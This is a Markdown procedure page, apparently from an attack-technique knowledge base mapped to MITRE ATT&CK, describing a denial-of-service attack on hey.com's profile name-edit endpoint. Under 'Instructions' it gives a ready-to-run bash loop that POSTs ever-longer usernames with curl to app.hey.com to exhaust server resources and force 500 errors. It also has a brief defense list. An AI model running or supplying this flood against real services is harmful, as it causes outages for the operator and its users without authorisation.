---
id: proc-uuid-4
tags:
  - dos
  - server-side
  - resource-exhaustion
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-submit-long-username]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:56.437Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[OS Exhaustion Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Network Denial of Service]]'
---
# Trigger-Server-Side-DoS-with-Multiple-Requests

## Summary

This procedure escalates the attack by sending repeated requests with increasingly long usernames, causing server resource exhaustion and 500 errors in hey.com.

## Description

By submitting multiple oversized payloads to the name edit endpoint, the server processes each without limits, leading to high CPU/memory usage and failure states. This exploits the lack of rate limiting or size caps, resulting in denial of service for the endpoint. Requires session authenticity; outcomes include error responses signaling overload.

## Requirements

1. Valid session for repeated POSTs
2. Scriptable tool like curl for looping requests
3. Increasing string lengths (e.g., via bash loops)

## Defense

Defensive measures and detection strategies:

- Rate limit profile edit requests per user/IP
- Implement payload size validation and rejection
- Monitor server logs for high-resource POST patterns

## Objectives

1. Exhaust server resources through processing
2. Induce 500 errors and downtime
3. Confirm impact on endpoint availability

## Instructions

### Step 1: Prepare Escalated Payloads

**Context**: Generate progressively longer strings for requests.

Use bash to create dynamic content (e.g., head -c 50000 < /dev/zero | tr '\0' 'A').

> Strings ready for submission.

### Step 2: Flood with Requests

**Context**: Loop submissions to overload the server.

**Command** ([[commands/curl-submit-long-username]]):
```bash
for i in {1..10}; do curl -X POST -d "name=$(head -c $((10000 + $i * 5000)) < /dev/zero | tr '\0' 'A')" https://app.hey.com/contacts/%user_id_number%/user/edit -H "Cookie: your_session_cookie" -H "Content-Type: application/x-www-form-urlencoded"; done
```

> Multiple 500 errors returned, indicating exhaustion.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- [[OS Exhaustion Flood]] OS Exhaustion Floods

## Commands Used

- [[commands/curl-submit-long-username]]

## Tools Used


## Tags

- dos
- server-side
- resource-exhaustion
